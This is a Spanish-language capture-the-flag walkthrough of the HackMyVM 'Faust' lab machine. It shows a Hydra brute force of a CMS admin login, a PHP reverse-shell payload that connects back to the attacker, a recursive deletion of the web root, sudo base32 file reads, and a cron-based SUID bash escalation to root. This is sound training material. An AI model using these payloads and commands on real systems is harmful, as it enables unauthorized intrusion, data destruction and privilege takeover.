---
icon: flag
---

# Faust HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 10:17 EDT
Nmap scan report for 192.168.5.55
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 54:0a:75:c5:26:56:f5:b0:5f:6d:e1:e0:77:15:c7:0d (RSA)
|   256 0b:d7:89:52:2d:13:16:cb:74:96:f5:5f:dd:3e:52:8e (ECDSA)
|_  256 5a:90:0c:f5:2b:7f:ba:1c:83:02:4d:e7:a2:a2:1d:5b (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Home - cool_cms
6660/tcp open  unknown
| fingerprint-strings: 
|   NULL, Socks5: 
|     MESSAGE FOR WWW-DATA:
|     [31m www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
|_    Paul
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6660-TCP:V=7.95%I=7%D=6/21%Time=6856BF1B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A5,"\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\x20\x1b[31m\x20
SF:\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20if\x20you\x20agre
SF:e\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x20then\x20you\x20
SF:have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x20\x20Paul\x20\x1
SF:b[0m\n")%r(Socks5,A5,"\n\n\x20\x20\x20MESSAGE\x20FOR\x20WWW-DATA:\n\n\
SF:x20\x1b[31m\x20\x20www-data\x20I\x20offer\x20you\x20a\x20dilemma:\x20i
SF:f\x20you\x20agree\x20to\x20destroy\x20all\x20your\x20stupid\x20work,\x2
SF:0then\x20you\x20have\x20a\x20reward\x20in\x20my\x20house\.\.\.\n\x20\x2
SF:0\x20Paul\x20\x1b[0m\n");
MAC Address: 08:00:27:1D:5B:19 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```

Veremos que hay un puerto `80` y un puerto `6660` en el que pone un mensaje bastante interesante, pero en el puerto `80` se aloja una pagina web, vamos a ver que contiene dicho puerto, si nos metemos veremos una pagina web normal sin ningun tipo de vulnerabilidad aparente, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.55/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/modules              (Status: 200) [Size: 3381]
/uploads              (Status: 200) [Size: 0]
/doc                  (Status: 200) [Size: 24]
/index.php            (Status: 200) [Size: 19347]
/assets               (Status: 200) [Size: 2129]
/admin                (Status: 200) [Size: 4479]
/lib                  (Status: 200) [Size: 24]
/.php                 (Status: 403) [Size: 277]
/config.php           (Status: 200) [Size: 0]
/tmp                  (Status: 200) [Size: 1131]
Progress: 102337 / 882244 (11.60%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 102701 / 882244 (11.64%)
===============================================================
Finished
===============================================================
```

Veremos una seccion bastante interesante llamada `/admin`, en el que si entramos veremos un `login`, pero si probamos credenciales por defecto como por ejemplo `admin:admin` no nos dejara, por lo que vamos a probar `fuerza bruta` con el `login` utilizando el usuario `admin` a ver si hay suerte.

## Escalate user paul

### Hydra

```shell
hydra -l admin -P <WORDLIST> <IP> http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-21 10:06:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.5.55:80/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect
[80][http-post-form] host: 192.168.5.55   login: admin   password: bullshit
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-21 10:07:15
```

Veremos que ha sacado de forma correcta las credenciales del `admin` por lo que nos loguearemos de la siguiente forma:

```
Username: admin
Password: bullshit
```

Una vez dentro si exploramos un poco el panel veremos la seccion `Tags` en la cual aparecen varias opciones, pero entre ellas hay un icono de una terminal llamado `User Defined Tags` por lo que se ve bastante interesante, si entramos dentro vamos a probar a darle al boton llamado `Add User Defined Tag`.

En el campo `Name` pondremos por ejemplo `Shell` y en el campo `Code:` pondremos lo siguiente:

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora le daremos a `Submit` y nos pondremos a la escucha de la siguiente forma.

```shell
nc -lvnp <PORT>
```

Estando a la escucha le daremos de nuevo a `shell` en el `Tag` y seguidamente le daremos a la opcion llamada `Run`, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.55] 34626
whoami
www-data
```

Por lo que vemos ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user paul

Antes vimos que en el puerto `6660` pone este mensaje:

```
MESSAGE FOR WWW-DATA:
[31m www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
Paul
```

Vemos que nos esta mencionando que si eliminamos nuestro "trabajo" en este caso el contenido de la carpeta `html/` nos dejara algo en la `/home` del usuario `Paul`, por lo que vamos hacer lo siguiente:

```
rm -r /var/www/html/*
```

Al hacer esto veremos que nos aparece un `password.txt` en la `/home` de `Paul` que pone lo siguiente:

```
Password is: YouCanBecomePaul
```

Vamos a probar dichas credenciales a ver si funcionan.

```shell
su paul
```

Metemos como contraseña `YouCanBecomePaul` y veremos que estamos dentro.

## Escalate user nico

Si hacemos `sudo -l` veremos lo siguiente:

```
Entrées par défaut pour paul sur debian :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur paul peut utiliser les commandes suivantes sur debian :
    (nico) /usr/bin/base32
```

Veremos que podemos ejecutar `Base32` como el usuario `nico` por lo que podremos realizar lo siguiente:

Vamos a leer la `flag` del usuario.

> user.txt

```shell
LFILE=/home/nico/user.txt
sudo -u nico base32 "$LFILE" | base32 --decode
```

Info:

```
gamhanarhu
```

Ahora vamos a listar la `/home` de `nico`.

```
total 32
drwxr-xr-x 3 nico nico 4096 avril  1  2021 .
drwxr-xr-x 4 root root 4096 avril  1  2021 ..
lrwxrwxrwx 1 root root    9 avril  1  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nico nico  220 avril  1  2021 .bash_logout
-rw-r--r-- 1 nico nico 3526 avril  1  2021 .bashrc
drwxr-xr-x 3 nico nico 4096 avril  1  2021 .local
-rw-r--r-- 1 nico nico  807 avril  1  2021 .profile
-rwx------ 1 nico nico   37 avril  1  2021 .secret.txt
-rwx------ 1 nico nico   11 avril  1  2021 user.txt
```

Veremos que hay un archivo interesante llamado `.secret.txt` si lo leemos veremos lo siguiente:

```shell
LFILE=/home/nico/.secret.txt
sudo -u nico base32 "$LFILE" | base32 --decode
```

Info:

```
UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==
```

Vemos que esta codificado en `Base64`, si lo decodificamos en nuestro `host` de esta forma.

```shell
echo 'UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==' | base64 -d
```

Info:

```
Pw => just_one_more_beer
```

Vemos lo que parece ser la contraseña de dicho usuario.

```shell
su nico
```

Metemos como contraseña `just_one_more_beer` y veremos que estaremos dentro.

## Escalate Privileges

En la `/` (Raiz) veremos una carpeta llamada `nico` si entramos dentro veremos un archivo de imagen llamado `homer.jpg`.

```
total 56
drwx------  2 nico nico  4096 avril  1  2021 .
drwxr-xr-x 19 root root  4096 avril  1  2021 ..
-rwxrwx---  1 nico root 47162 avril  1  2021 homer.jpg
```

Tiene toda la pinta de que oculta algun archivo o algo por dentro, por lo que vamos a utilizar la herramienta `steghide` para ver si podemos extraer algun archivo con suerte sin contraseña.

> NOTA

El archivo nos lo pasamos mediante un servidor de `python3` a nuestra maquina atacante con `wget`.

```shell
steghide extract -sf homer.jpg
```

Dejamos la contraseña vacia...

Info:

```
Enter passphrase: 
wrote extracted data to "note.txt".
```

Veremos que ha funcionado, nos ha extraido un archivo llamado `note.txt` en el que pone lo siguiente:

```
my /tmp/goodgame file was so good... but I lost it
```

Por lo que podemos entender con esto es que por detras tiene que haber algun `crontab` programado para ejecutar dicho archivo, si nosotros nos vamos a la carpeta `/tmp` no veremos el archivo por lo que vamos a probar a crear uno malicioso a ver si se ejecuta como `root`.

```shell
nano /tmp/goodgame

#Dentro del nano
#!/bin/sh

chmod u+s /bin/bash
```

Lo guardamos, establecemos los permisos necesarios...

```shell
chmod +x /tmp/goodgame
```

Y esperamos un rato, despues de esperar vamos a comprobar que haya funcionado listando la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 avril 18  2019 /bin/bash
```

Por lo que vemos a funcionado, por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Con esto seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
lasarnsilgam
```
